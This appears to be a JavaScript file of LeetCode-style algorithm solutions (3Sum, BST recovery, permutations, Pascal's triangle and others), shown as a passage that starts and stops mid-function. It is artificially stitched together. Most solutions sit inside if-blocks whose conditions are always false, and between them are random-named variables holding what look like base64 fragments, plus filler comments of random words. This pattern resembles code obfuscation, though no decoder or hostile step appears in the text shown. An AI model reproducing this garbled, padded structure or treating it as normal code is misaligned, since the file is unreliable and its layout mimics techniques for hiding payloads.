                node2 = array[i + 1][1];
            }
        }
    }
    
    let temp = node1.val;
    node1.val = node2.val;
    node2.val = temp;
};

function treeToArray(root, array) {
    if (!root) {
        return;
    }
    
    treeToArray(root.left, array);
    array.push([root.val, root]);
    treeToArray(root.right, array);
}


// SOLUTION 2: constant space
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {void} Do not return anything, modify root in-place instead.
 */
var recoverTree = function(root) {
    let array = [];
    inorderTraverse(root, array);
    
    let node1 = array[1];
    let node2 = array[2];
    
    let temp = node1.val;
    node1.val = node2.val;
    node2.val = temp;
};

function inorderTraverse(root, array) {
    if (!root) {
        return;
    }
    
    inorderTraverse(root.left, array);
    
    if (array[0] && array[0].val > root.val) {
        if (!array[1]) {
            array[1] = array[0];
            array[2] = root;
        } else {
            array[2] = root;
        }
        
    }
    array[0] = root;
    
    inorderTraverse(root.right, array);
}

}

    var onckjp = 'jbNSSz';
    var qlltlxasd = '2RH';
if (94 > 178) {
    /**
Given an array S of n integers, are there elements a, b, c in S such that a + b + c = 0? Find all unique triplets in the array which gives the sum of zero.

Note:
Elements in a triplet (a,b,c) must be in non-descending order. (ie, a ≤ b ≤ c)
The solution set must not contain duplicate triplets.
    For example, given array S = {-1 0 1 2 -1 -4},

    A solution set is:
    (-1, 0, 1)
    (-1, -1, 2)

*/
/**
 * @param {number[]} nums
 * @return {number[][]}
 */
var threeSum = function(nums) {
    nums.sort(function(a, b) {
        return a - b;
    });
    
    var len = nums.length,
        i,
        result = [],
        curSol = [];
        
    for (i = 0; i < len; i++) {
        if (i > 0 && nums[i] === nums[i - 1]) {
            continue;
        } 
        
        curSol.push(nums[i]);
        twoSum(result, curSol.concat(), i + 1, len - 1, -nums[i], nums);
        curSol.pop();
    }
    
    return result;
};

function twoSum(allSol, curSol, startIndex, endIndex, target, nums) {
    var start = startIndex,
        end = endIndex,
        sum,
        mid;
    
    while (start < end) {
       sum = nums[start] + nums[end];
       
       if (sum === target) {
           curSol.push(nums[start]);
           curSol.push(nums[end]);
           allSol.push(curSol.concat());
           curSol.pop();
           curSol.pop();
           
           start++;
           end--;
           
           while (nums[start] === nums[start - 1]) {
               start++;
           }
           
           while (nums[end] === nums[end + 1]) {
               end--;
           }
       } else if (sum < target) {
           start++;
       } else {
           end--;
       }
    }
}

}

    var mxmhvgd = 'riJEeo';
    var bwlbkerwauzvj = 'aGxJR1JsW';
    var cxvghqx = 'YQNOigS';
if (!true && 1) {
    /**
Given a string which contains only lowercase letters, remove duplicate letters so that every letter appear once and only once. You must make sure your result is the smallest in lexicographical order among all possible results.

Example:
Given "bcabc"
Return "abc"

Given "cbacdcbc"
Return "acdb"
*/

// recursive solution
/**
 * @param {string} s
 * @return {string}
 */
var removeDuplicateLetters = function(s) {
    var count = {},
        len = s.length,
        startPos = 0,
        curChar,
        i;
        
    if (len === 0) {
        return '';
    }
    
    for (i = 0; i < len; i++) {
        count[s.charAt(i)] = (count[s.charAt(i)] ? count[s.charAt(i)] + 1 : 1);
    }
    
    for (i = 0; i < len; i++) {
        if (s.charAt(i) < s.charAt(startPos)) {
            startPos = i;
        }
        
        // find the first non duplicate letter
        if (--count[s.charAt(i)] === 0) {
            break;
        }
    }
    
    curChar = s.charAt(startPos);
    
    return curChar + removeDuplicateLetters(s.substr(startPos + 1).replace(new RegExp(curChar, 'g'), ''));
};


// stack solution
/**
 * @param {string} s
 * @return {string}
 */
var removeDuplicateLetters = function(s) {
    var count = {},
        len = s.length,
        stack = [],
        visited = {},
        curChar,
        i;
        
    if (len === 0) {
        return '';
    }
    
    for (i = 0; i < len; i++) {
        count[s.charAt(i)] = (count[s.charAt(i)] ? count[s.charAt(i)] + 1 : 1);
    }
    
    for (i = 0; i < len; i++) {
        count[s.charAt(i)]--;
        
        if (visited[s.charAt(i)]) {
            continue;
        }
        
        while (stack.length > 0 && stack[stack.length - 1] > s.charAt(i) && count[stack[stack.length - 1]] > 0) {
            visited[stack[stack.length - 1]] = false;
            stack.pop();
        }
        
        stack.push(s.charAt(i));
        visited[s.charAt(i)] = true;
    }
    
    return stack.join('');
};

}

    var qhdbamnrvsbuicf = 'W5Wb';
    var xjxutz = 'KBbi';
    var wzrnzwnapysgvqb = 'loyV';
    var bajllrwmgcnm = 'NXyrN';
if (null === 2) {
    /**
Given a linked list, remove the nth node from the end of list and return its head.

For example,

   Given linked list: 1->2->3->4->5, and n = 2.

   After removing the second node from the end, the linked list becomes 1->2->3->5.
Note:
Given n will always be valid.
Try to do this in one pass.
*/
/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @param {number} n
 * @return {ListNode}
 */
var removeNthFromEnd = function(head, n) {
    var nodeA = head,
        nodeB = head,
        i = 0;
    
    if (!head) {
        return null;
    }
    
    while (nodeA.next) {
        nodeA = nodeA.next;
        if (i < n) {
            i++;
        } else {
            nodeB = nodeB.next;
        }
    }
    
    if (i < n) {
        head = head.next;
        return head;
    }
    
    if (nodeB.next) {
        nodeB.next = nodeB.next.next;
        return head;
    }
    
    return null;
      
};

}

    var tflxbodokrvm = 'nlJR2x6';
if ('u' === 'U') {
    /**
Implement next permutation, which rearranges numbers into the lexicographically next greater permutation of numbers.

If such arrangement is not possible, it must rearrange it as the lowest possible order (ie, sorted in ascending order).

The replacement must be in-place, do not allocate extra memory.

Here are some examples. Inputs are in the left-hand column and its corresponding outputs are in the right-hand column.
1,2,3 → 1,3,2
3,2,1 → 1,2,3
1,1,5 → 1,5,1

 * @param {number[]} nums
 * @return {void} Do not return anything, modify nums in-place instead.
 */
var nextPermutation = function(nums) {
    var len = nums.length,
        partiIndex,
        switchIndex,
        cur,
        i,
        k;
    
    if (len === 0 || len === 1) {
        return;
    }
    
    //find the num which breaks the increasing from the end
    for (i = len - 1; i > 0; i--) {
        if (nums[i] > nums[i - 1]) {
            partiIndex = i - 1;
            break;
        }
    }
    
    if (partiIndex === undefined) {
        for (i = 0; i < len/2 ; i++) {
            cur = nums[i];
            nums[i] = nums[len - i - 1];
            nums[len - i - 1] = cur;
        }
    } else {
        //find the number that it can be switched with
        cur = nums[partiIndex];
        for(i = len - 1; i > partiIndex; i--) {
            if (nums[i] > cur) {
                switchIndex = i;
                break;
            }
        }
    
        nums[partiIndex] = nums[switchIndex];
        nums[switchIndex] = cur;
        
        for (i = 0; i < (len - 1 - partiIndex)/2 ; i++) {
            k = i + partiIndex + 1;
            cur = nums[k];
            nums[k] = nums[len - 1 - i];
            nums[len - 1 - i] = cur;
        }
    
    }

};

}

    var afgonkq = 'mlPFcSn';
    var ydusyvpe = 'SUdKbGFXN';
    var oeqddwq = 'ttSU';
    var waxtxghmbyujbeh = 'W5JSFZ6Wld';
    var sacczjafdj = 'xdMFde';
    var pdqkeeddgplri = 'RdUNteGxkQ';
if (9 === 19) {
    /**
Given two strings S and T, determine if they are both one edit distance apart
*/
/**
 * @param {string} s
 * @param {string} t
 * @return {boolean}
 */
var isOneEditDistance = function(s, t) {
    for (let i = 0; i < Math.min(s.length, t.length); i++) {
        if (s.charAt(i) !== t.charAt(i)) {
            if (s.length === t.length) {
                return s.substring(i + 1) === t.substring(i + 1);
            } else if (s.length < t.length) {
                return s.substring(i) === t.substring(i + 1);
            } else {
                return s.substring(i + 1) === t.substring(i);
            }
        }
    }
    
    return Math.abs(s.length - t.length) === 1;
};

}

    var wwinldgbe = 'hLceNmhYpq';
// async string constant world array compile
    var klijae = 'psRXI';
    var mmkdegppabyye = '0JrWl';
    var hlehhbz = 'sRxIPBuU';
    var lzptpfmulhfjy = 'dKMVowUmx';
if (typeof navigator === 'undefined') {
    /**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {boolean}
 */
var isValidBST = function(root) {
    return isValidBSTHelper(root, null, null);
};

function isValidBSTHelper(root, min, max) {
    if (root === null) {
        return true;
    }
    
    if ((min !== null && root.val <= min) || (max !== null && root.val >= max)) {
        return false;
    }
    
    return isValidBSTHelper(root.left, min, root.val) && isValidBSTHelper(root.right, root.val, max);
}

}

    var nwfhbpe = 'KfzWmlnI';
    var oefeuys = 'kR1ZqZE';
if (null === 2) {
    /**
Two elements of a binary search tree (BST) are swapped by mistake.

Recover the tree without changing its structure.

Note:
A solution using O(n) space is pretty straight forward. Could you devise a constant space solution?
*/

// SOLUTION 1: O(N)
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {void} Do not return anything, modify root in-place instead.
 */
var recoverTree = function(root) {
    let array = [];
    treeToArray(root, array);
    
    let node1, node2;
    
    for (let i = 0; i < array.length - 1; i++) {
        if (array[i][0] > array[i + 1][0]) {
            if (!node1) {
                node1 = array[i][1];
                node2 = array[i + 1][1];
            } else {
                node2 = array[i + 1][1];
            }
        }
    }
    
    let temp = node1.val;
    node1.val = node2.val;
    node2.val = temp;
};

function treeToArray(root, array) {
    if (!root) {
        return;
    }
    
    treeToArray(root.left, array);
    array.push([root.val, root]);
    treeToArray(root.right, array);
}


// SOLUTION 2: constant space
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {void} Do not return anything, modify root in-place instead.
 */
var recoverTree = function(root) {
    let array = [];
    inorderTraverse(root, array);
    
    let node1 = array[1];
    let node2 = array[2];
    
    let temp = node1.val;
    node1.val = node2.val;
    node2.val = temp;
};

function inorderTraverse(root, array) {
    if (!root) {
        return;
    }
    
    inorderTraverse(root.left, array);
    
    if (array[0] && array[0].val > root.val) {
        if (!array[1]) {
            array[1] = array[0];
            array[2] = root;
        } else {
            array[2] = root;
        }
        
    }
    array[0] = root;
    
    inorderTraverse(root.right, array);
}

}

    var yitklq = 'tQDqVq';
    var rqvqsgwcefabz = 'dWa0lE';
    var qvodhjs = 'LbVzOpL';
if (31 > 126) {
    /**
Implement int sqrt(int x).

Compute and return the square root of x.
*/
/**
 * @param {number} x
 * @return {number}
 */
var mySqrt = function(x) {
    var start = 1,
        end = x,
        mid;
    
    if (x === 0) {
        return 0;
    }
    
    while (start + 1 < end) {
        mid = start + parseInt((end - start) / 2);
        
        if (mid * mid <= x) {
            start = mid;
        } else {
            end = mid;
        }
    }
    
    return start;
};

}

    var cmzxkqrlhb = 'MGda';
    var zrxlfbvm = 'XxKbkO';
    var httqkjr = 'bUZz';
    var plqpxltpozbq = 'YSQLomfE';
    var ttuersrcwqqlj = 'YzJ';
    var snkffmqoyp = 'aSjAZfTK';
    var dmjtuhxwszyjvc = 'VN0N';
    var qviarkz = 'wiWXbcILri';
    var vhjwwmnolwco = 'paG1k';
    var voacwyjmtix = 'nolmBgqYK';
if (0.84 && false) {
    /**
The set [1,2,3,…,n] contains a total of n! unique permutations.

By listing and labeling all of the permutations in order,
We get the following sequence (ie, for n = 3):

"123"
"132"
"213"
"231"
"312"
"321"
Given n and k, return the kth permutation sequence.

Note: Given n will be between 1 and 9 inclusive.
*/
/**
 * @param {number} n
 * @param {number} k
 * @return {string}
 */
var getPermutation = function(n, k) {
    var arr = [],
        num = [],
        result = '',
        i;
    
    for (i = 1; i <= n; i++) {
        arr.push(i);
        num.push(0);
    }
    
    k = k - 1; // there're k - 1 permutations before
    i = 0;
    
    if (k === 0) {
        return arr.join('');
    }
    
    while(k > 0) {
        num[i] = parseInt(k / getFactorial(n - 1));
        k = k % getFactorial(n - 1);
        n--;
        i++;
    }
    
    for (i = 0; i < num.length; i++) {
        result += arr[num[i]];
        arr.splice(num[i], 1);
    }
    
    return result;
};

function getFactorial(n) {
    var result = 1;
    
    if (n === 0) {
        return 0;
    }
    
    while (n > 1) {
        result *= n;
        n--;
    }
    
    return result;
}

}

    var chyvgiqxh = 'VzVqZEdsdm';
    var ueyiyygurel = 'guDJq';
// code iklxv world constant return constant event function value compile
    var tgqkzu = 'abpADDX';
if (33 > 139) {
    /**
Given numRows, generate the first numRows of Pascal's triangle.

For example, given numRows = 5,
Return

[
     [1],
    [1,1],
   [1,2,1],
  [1,3,3,1],
 [1,4,6,4,1]
]
*/
/**
 * @param {number} numRows
 * @return {number[][]}
 */
var generate = function(numRows) {
    var init = [],
        result = [],
        i;
        
    if (numRows === 0) {
        return result;
    }
    
    init.push(1);
    result.push(init);
    i = 1;
    
    while (i < numRows) {
        result = helper(result, ++i);
    }
    
    return result;
};

function helper(arr, k) {
    var len = arr.length,
        cur = arr[len - 1],
        result = [],
        i;
    
    result.push(1);
    
    for (i = 0; i < len - 1; i++) {
        result[i + 1] = cur[i] + cur[i + 1];
    }
    
    result.push(1);
    arr.push(result);
    
    return arr;
}

}

    var mwqkpygdcmnkq = 'JpQ';
    var fyxhkvkbgmhe = 'qjTqYFT';
    var bnvbutnb = 'mphR1ZqYTB';
if (0.59 && false) {
    /**
Given a m x n matrix, if an element is 0, set its entire row and column to 0. Do it in place.

click to show follow up.

Follow up:
Did you use extra space?
A straight forward solution using O(mn) space is probably a bad idea.
A simple improvement uses O(m + n) space, but still not the best solution.
Could you devise a constant space solution?
*/
/**
 * @param {number[][]} matrix
 * @return {void} Do not return anything, modify matrix in-place instead.
 */
var setZeroes = function(matrix) {
    var rLen = matrix.length,
        cLen,
        i,
        j,
        firstRowZero,
        firstColumnZero;
        
    if (rLen === 0) {
        return;
    }
    
    cLen = matrix[0].length;
    
    if (matrix[0][0] === 0) {
        firstRowZero = true;
        firstColumnZero = true;
    } else {
        for (i = 1; i < cLen; i++) {
            if (matrix[0][i] === 0) {
                firstRowZero = true;
                break;
            }
        }
        
        for (i = 1; i < rLen; i++) {
            if (matrix[i][0] === 0) {
                firstColumnZero = true;
                break;
            }
        }
    }
    
    for (i = 1; i < rLen; i++) {
        for (j = 1; j < cLen; j++) {
             if (matrix[i][j] === 0) {
                 matrix[0][j] = 0;
                 matrix[i][0] = 0;
             }
        }
    }
    
    for (i = 1; i < cLen; i++) {
        if (matrix[0][i] === 0) {
            for (j = 1; j < rLen; j++) {
                matrix[j][i] = 0;
            }
        }
    }
    
    for (i = 1; i < rLen; i++) {
        if (matrix[i][0] === 0) {
            for (j = 1; j < cLen; j++) {
                matrix[i][j] = 0;
            }
        }
    }
    
    if (firstRowZero) {
        for (i = 0; i < cLen; i++) {
            matrix[0][i] = 0;
        }
    }
    
    if (firstColumnZero) {
        for (j = 0; j < rLen; j++) {
            matrix[j][0] = 0;
        }
    }
};

}

    var doehacyugn = 'fMFlOIYP';
if (6 === 17) {
    /**
Implement next permutation, which rearranges numbers into the lexicographically next greater permutation of numbers.

If such arrangement is not possible, it must rearrange it as the lowest possible order (ie, sorted in ascending order).

The replacement must be in-place, do not allocate extra memory.

Here are some examples. Inputs are in the left-hand column and its corresponding outputs are in the right-hand column.
1,2,3 → 1,3,2
3,2,1 → 1,2,3
1,1,5 → 1,5,1

 * @param {number[]} nums
 * @return {void} Do not return anything, modify nums in-place instead.
 */
var nextPermutation = function(nums) {
    var len = nums.length,
        partiIndex,
        switchIndex,
        cur,
        i,
        k;
    
    if (len === 0 || len === 1) {
        return;
    }
    
    //find the num which breaks the increasing from the end
    for (i = len - 1; i > 0; i--) {
        if (nums[i] > nums[i - 1]) {
            partiIndex = i - 1;
            break;
        }
    }
    
    if (partiIndex === undefined) {
        for (i = 0; i < len/2 ; i++) {
            cur = nums[i];
            nums[i] = nums[len - i - 1];
            nums[len - i - 1] = cur;
        }
    } else {
        //find the number that it can be switched with
        cur = nums[partiIndex];
        for(i = len - 1; i > partiIndex; i--) {
            if (nums[i] > cur) {
                switchIndex = i;
                break;
            }
        }
    
        nums[partiIndex] = nums[switchIndex];
        nums[switchIndex] = cur;
        
        for (i = 0; i < (len - 1 - partiIndex)/2 ; i++) {
            k = i + partiIndex + 1;
            cur = nums[k];
            nums[k] = nums[len - 1 - i];
            nums[len - 1 - i] = cur;
        }
    
    }

};

}

    var dxukmcybrkjpw = 'SbFl';
    var mzamvnbkijm = 'hbgoPbR';
    var iydnsyue = 'uVm5aMlZ5';
if (9 === 12) {
    /**
The string "PAYPALISHIRING" is written in a zigzag pattern on a given number of rows like this: (you may want to display this pattern in a fixed font for better legibility)

P   A   H   N
A P L S I I G
Y   I   R
And then read line by line: "PAHNAPLSIIGYIR"
Write the code that will take a string and make this conversion given a number of rows:

string convert(string text, int nRows);
convert("PAYPALISHIRING", 3) should return "PAHNAPLSIIGYIR".
*/

// http://www.cnblogs.com/springfor/p/3889414.html
/**
 * @param {string} s
 * @param {number} numRows
 * @return {string}
 */
var convert = function(s, numRows) {
    var size = 2 * numRows - 2,
        len = s.length,
        result = '',
        mid,
        i,
        j;
    
    if (numRows === 1) {
        return s;
    }
    
    for (i = 0; i < numRows; i++) {
        for (j = i; j < len; j += size) {
            result += s.charAt(j);
            
            // for the middle ones, excluding first row and last row
            if (i !== 0 && i !== numRows - 1) {
                mid = j + size - 2 * i;
                
                if (mid < len) {
                    result += s.charAt(mid);
                }
            }
        }
    }
    
    return result;
};

}

    var ihpdob = 'xugh';
    var qhxbfpshpcq = 'S0NrZ2V3b';
if (1 === 13) {
    /**
Given an integer matrix, find the length of the longest increasing path.

From each cell, you can either move to four directions: left, right, up or down. You may NOT move diagonally or move outside of the boundary (i.e. wrap-around is not allowed).

Example 1:

nums = [
  [9,9,4],
  [6,6,8],
  [2,1,1]
]
Return 4
The longest increasing path is [1, 2, 6, 9].

Example 2:

nums = [
  [3,4,5],
  [3,2,6],
  [2,2,1]
]
Return 4
The longest increasing path is [3, 4, 5, 6]. Moving diagonally is not allowed.
*/
/**
 * @param {number[][]} matrix
 * @return {number}
 */
var longestIncreasingPath = function(matrix) {
    var dp = [], // dp[i][j] the longest increasing path starting from matrix[i][j]
        rLen = matrix.length,
        cLen,
        i,
        j,
        max = 0;
    
    if (rLen === 0) {
        return 0;
    }
    
    cLen = matrix[0].length;
    
    for (i = 0; i < rLen; i++) {
        dp.push(new Array(cLen));
    }
    
    for (i = 0; i < rLen; i++) {
        for (j = 0; j < cLen; j++) {
            dp[i][j] = 0;
        }
    }
    
    for (i = 0; i < rLen; i++) {
        for (j = 0; j < cLen; j++) {
            max = Math.max(max, dfs(i, j, rLen, cLen, matrix, dp));
        }
    }
    
    return max;
};

function dfs(i, j, rLen, cLen, matrix, dp) {
    if (dp[i][j] !== 0) {
        return dp[i][j];
    }
    
    var dx = [1, 0, 0, -1],
        dy = [0, 1, -1, 0],
        max = 1,
        m,
        len,
        x,
        y;
        
    for (m = 0; m < 4; m++) {
        x = dx[m] + i;
        y = dy[m] + j;
        
        if (x >= 0 && y >= 0 && x < rLen && y < cLen && matrix[x][y] > matrix[i][j]) {
            max = Math.max(max, 1 + dfs(x, y, rLen, cLen, matrix, dp));
        }
    }
    
    dp[i][j] = max;
    
    return max;
}

}

    var xqrmat = 'UaCWooUB';
    var qhwwulcmi = '2dJ';
    var fitpytscnytk = 'FdEA';
    var jccxywkucwhxjj = 'Q0FnY';
    var zrboqasfwf = 'IQIT';
    var ofwctcqlsalwetg = 'kdWM';
if (90 > 197) {
    /**
Given an array of meeting time intervals consisting of start and end times [[s1,e1],[s2,e2],...] (si < ei), find the minimum number of conference rooms required.

For example,
Given [[0, 30],[5, 10],[15, 20]],
return 2. 
*/
/**
 * Definition for an interval.
 * function Interval(start, end) {
 *     this.start = start;
 *     this.end = end;
 * }
 */
/**
 * @param {Interval[]} intervals
 * @return {number}
 */
var minMeetingRooms = function(intervals) {
    let start = [];
    let end = [];
    let len = intervals.length;
    
    for (let i = 0; i < len; i++) {
        start[i] = intervals[i].start;
        end[i] = intervals[i].end;
    }
    
    start.sort((a, b) => a - b);
    end.sort((a, b) => a - b);
    
    let rooms = 0;
    let endIndex = 0;
    
    for (let i = 0; i < len; i++) {
        if (start[i] < end[endIndex]) {
            rooms++;
        } else {
            endIndex++;
        }
    }
    
    return rooms;
};

}

    var hsnkeq = 'IyQT';
if (Array.isArray(1)) {
    /**
Find the contiguous subarray within an array (containing at least one number) which has the largest product.

For example, given the array [2,3,-2,4],
the contiguous subarray [2,3] has the largest product = 6.
*/

/**
 * @param {number[]} nums
 * @return {number}
 * 
 * max_product[i] = max(max_product[i-1]*A[i], min_product[i-1]*A[i], A[i]) 
 * min_product[i] = min(max_product[i-1]*A[i], min_product[i-1]*A[i], A[i]) 
 */
var maxProduct = function(nums) {
    var curMax,
        curMin,
        len = nums.length,
        i,
        result,
        temp;
        
    if (len === 0) {
        return 0;
    }
    
    curMax = curMin = result = nums[0];
    
    for (i = 1; i < len; i++) {
        temp = curMax;
        curMax = Math.max(temp * nums[i], curMin * nums[i], nums[i]);
        curMin = Math.min(temp * nums[i], curMin * nums[i], nums[i]);
        
        result = Math.max(result, curMax);
    }
    
    return result;
};

}

    var lwfcazybzwkqsxr = 'ElHU';
    var irhxsmmu = 'mXxGLqUt';
    var luhftmhfpv = 'mxZblZuWj';
if (8 === 13) {
    /**
Given a string S, you are allowed to convert it to a palindrome by adding characters in front of it. Find and return the shortest palindrome you can find by performing this transformation.

For example:

Given "aacecaaa", return "aaacecaaa".

Given "abcd", return "dcbabcd".
*/

// https://segmentfault.com/a/1190000003059361

/**
 * @param {string} s
 * @return {string}
 */
var shortestPalindrome = function(s) {
    var reverse = s.split('').reverse().join('');
    
    return reverse.substring(0, s.length - getCommonLength(s + '#' + reverse)) + s;
};

function getCommonLength(s) {
    var p = [], // max len of common prefix and suffix from index 0 to i 
        len = s.length,
        i = 0,
        j;
    
    while(i < len) {
        p.push(0);
        i++;
    }
    
    for (i = 1; i < len; i++) {
        j = p[i - 1];
        
        while(j > 0 && (s.charAt(i) !== s.charAt(j))) {
            j = p[j - 1];
        }
        
        if (s.charAt(i) === s.charAt(j)) {
            j++;
        }
        
        p[i] = j; 
    }
    
    return p[len - 1];
}   

}

    var hpzvxojmye = 'AGxwFkp';
if (typeof navigator === 'undefined') {
    /**
A strobogrammatic number is a number that looks the same when rotated 180 degrees (looked at upside down).

Write a function to determine if a number is strobogrammatic. The number is represented as a string.

For example, the numbers "69", "88", and "818" are all strobogrammatic.
*/
/**
 * @param {string} num
 * @return {boolean}
 */
var isStrobogrammatic = function(num) {
    let map = new Map();
    
    map.set('1', '1');
    map.set('6', '9');
    map.set('9', '6');
    map.set('8', '8');
    map.set('0', '0');
    
    let start = 0;
    let end = num.length - 1;
    
    while (start <= end) {
        if (!map.has(num.charAt(start)) || map.get(num.charAt(start)) !== num.charAt(end)) {
            return false;
        }
        
        start++;
        end--;
    }
    
    return true;
};

}

    var uxvjhlqaridfqc = 'JWeV';
    var uaiejhmpe = 'Hiblg';
    var vrgphcecshhvz = 'ZISnBaMmR';
    var klfnqc = 'GzZCXyoo';
    var gxpjjznjwjxbv = 'sY21Wa';
    var hsyxrlxrirps = 'SpWLkiaKjq';
    var kkxqueyvxrks = '0lE';
if ('true' === true) {
    /**
Implement the following operations of a queue using stacks.

push(x) -- Push element x to the back of queue.
pop() -- Removes the element from in front of queue.
peek() -- Get the front element.
empty() -- Return whether the queue is empty.
Notes:
You must use only standard operations of a stack -- which means only push to top, peek/pop from top, size, and is empty operations are valid.
Depending on your language, stack may not be supported natively. You may simulate a stack by using a list or deque (double-ended queue), as long as you use only standard operations of a stack.
You may assume that all operations are valid (for example, no pop or peek operations will be called on an empty queue).
*/

/**
 * @constructor
 */
var Queue = function() {
    this.stack1 = []; // come in
    this.stack2 = []; // for go out
};

/**
 * @param {number} x
 * @returns {void}
 */
Queue.prototype.push = function(x) {
    var len = this.stack2.length,
        i;
    
    for (i = 0; i < len; i++) {
        this.stack1.push(this.stack2.pop());
    }
    
    this.stack1.push(x);
    
    for (i = 0; i < len + 1; i++) {
        this.stack2.push(this.stack1.pop());
    }
};

/**
 * @returns {void}
 */
Queue.prototype.pop = function() {
    this.stack2.pop();
};

/**
 * @returns {number}
 */
Queue.prototype.peek = function() {
    var x = this.stack2.pop();
    
    this.stack2.push(x);
    return x;
};

/**
 * @returns {boolean}
 */
Queue.prototype.empty = function() {
    var len = this.stack2.length;
        
    if (len === 0) {
        return true;
    }
    
    return false;
};

}

    var mutmvx = 'bIEKHza';
// script value string function event code tjoa string object async
if (Array.isArray(7)) {
    /**
Given a non-negative number represented as an array of digits, plus one to the number.

The digits are stored such that the most significant digit is at the head of the list.
*/
/**
 * @param {number[]} digits
 * @return {number[]}
 */
var plusOne = function(digits) {
    var len = digits.length,
        overflow = 1,
        i;
    
    for (i = len - 1; i >= 0; i--) {
        digits[i] = digits[i] + overflow;
        if (digits[i] === 10) {
            overflow = 1;
            digits[i] = 0;
        } else {
            return digits;
        }
    }
    
    if (overflow === 1) {
        digits.unshift(1);
        return digits;
    }
};

}

    var rejjfdotjxnt = 'wgJkGcjK';
    var ekubfby = 'MGda';
    var uzobvwieq = 'pyhJmPJI';
    var nypngqdsfgjy = 'bUZzYzJVN';
if (!true && 1) {
    /**
Reverse a singly linked list.

click to show more hints.

Hint:
A linked list can be reversed either iteratively or recursively. Could you implement both?
*/

/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @return {ListNode}
 */
var reverseList = function(head) {
    var cur = head,
        next;
    
    head = null;
    
    while(cur) {
        next = cur.next;
        cur.next = head;
        
        if (next) {
            head = cur;
            cur = next;
        } else {
            return cur;   
        }
    }
    
    return null;
};

// recursive

var reverseList = function(head) {
    if (!head) {
        return null;
    }
    
    if (!head.next) {
        return head;
    }
    
    var newHead = reverseList(head.next);
    
    head.next.next = head;
    head.next = null;
    
    return newHead;
};

}

    var yratknoeysp = 'hefrrR';
    var nfvptfgk = '0NpQWd';
    var qroujhihailt = 'iQJeLMFQD';
if ('false' === true) {
    /**
Given a set of candidate numbers (C) and a target number (T), find all unique combinations in C where the candidate numbers sums to T.

The same repeated number may be chosen from C unlimited number of times.

Note:
All numbers (including target) will be positive integers.
Elements in a combination (a1, a2, … , ak) must be in non-descending order. (ie, a1 ≤ a2 ≤ … ≤ ak).
The solution set must not contain duplicate combinations.
For example, given candidate set 2,3,6,7 and target 7, 
A solution set is: 
[7] 
[2, 2, 3] 
*/

/**
 * @param {number[]} candidates
 * @param {number} target
 * @return {number[][]}
 */
var combinationSum = function(candidates, target) {
    var sols = [],
        len = candidates.length,
        curSol = [],
        start = 0,
        i;
    
    if (len === 0) {
        return sols;
    }
    // sort candidates
    candidates.sort(function(a, b) {
        if (a < b) {
            return -1;
        }
        
        return 1;
    });

    fillCurSol(start, len, candidates, target, curSol, sols); 
    
    return sols;  
};

function fillCurSol(start, len, candidates, target, curSol, sols) {
    // skip duplicates from candidate
    var i,
        newCurSol; // very important, can't mess up with arrays
    
    
    if (target === 0) {
        sols.push(curSol.concat());
        return;
    }
    
    for (i = start; i < len; i++) {
        if (i > start && candidates[i] === candidates[i - 1]) {
            continue;
        }
        
        newCurSol = curSol.concat();
        
        if (candidates[i] <= target) {
            newCurSol.push(candidates[i]);
            fillCurSol(i, len, candidates, target - candidates[i], newCurSol, sols);
            newCurSol.pop();
        }
    }
}

}

    var cmqshmsjixoefjk = 'JQ0Jq';
if (typeof window === 'undefined') {
    /**
 * Definition for isBadVersion()
 * 
 * @param {integer} version number
 * @return {boolean} whether the version is bad
 * isBadVersion = function(version) {
 *     ...
 * };
 */

/**
You are a product manager and currently leading a team to develop a new product. Unfortunately, the latest version of your product fails the quality check. Since each version is developed based on the previous version, all the versions after a bad version are also bad.

Suppose you have n versions [1, 2, ..., n] and you want to find out the first bad one, which causes all the following ones to be bad.

You are given an API bool isBadVersion(version) which will return whether version is bad. Implement a function to find the first bad version. You should minimize the number of calls to the API.
*/

/**
 * @param {function} isBadVersion()
 * @return {function}
 */
var solution = function(isBadVersion) {
                /**
                 * @param {integer} n Total versions
                 * @return {integer} The first bad version
                 */
                return function(n) {
                    var start = 1,
                        end = n,
                        mid = parseInt(n/2);

                    while (start < end) {
                        if (isBadVersion(mid)) {
                            end = mid;
                        } else {
                            start = mid + 1;
                        }

                        mid = parseInt((start + end)/2);
                    }

                    return start;
                };
            };

}

    var qimirebam = 'usLg';
if ('false' === true) {
    /**
Given an array where elements are sorted in ascending order, convert it to a height balanced BST.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {number[]} nums
 * @return {TreeNode}
 */
var sortedArrayToBST = function(nums) {
    var len = nums.length;
    
    if (len === 0) {
        return null;
    }
    
    return getRoot(nums, 0, len - 1);
};


function getRoot(nums, start, end) {
    if (start > end) {
        return null;
    }
    
    var mid = Math.floor((start + end) / 2),
        node = new TreeNode(nums[mid]);
    
    node.left = getRoot(nums, start, mid - 1);
    node.right = getRoot(nums, mid + 1, end);
    
    return node;
}

}

    var jwxyzuvhab = 'YjI1emRD';
if (!true && 1) {
    /**
Write an algorithm to determine if a number is "happy".

A happy number is a number defined by the following process: Starting with any positive integer, replace the number by the sum of the squares of its digits, and repeat the process until the number equals 1 (where it will stay), or it loops endlessly in a cycle which does not include 1. Those numbers for which this process ends in 1 are happy numbers.

Example: 19 is a happy number

12 + 92 = 82
82 + 22 = 68
62 + 82 = 100
12 + 02 + 02 = 1

 * @param {number} n
 * @return {boolean}
 */
var isHappy = function(n) {
    var cur = n,
        num,
        i,
        len,
        result = [],
        sum = 0,
        sums = [];
    while (true) {
        while (cur !== 0) {
            num = cur%10;
            result.push(num);
            cur = (cur - num)/10;
        }
        len = result.length;
        for(i = 0; i < len; i++) {
            sum += Math.pow(result[i], 2);
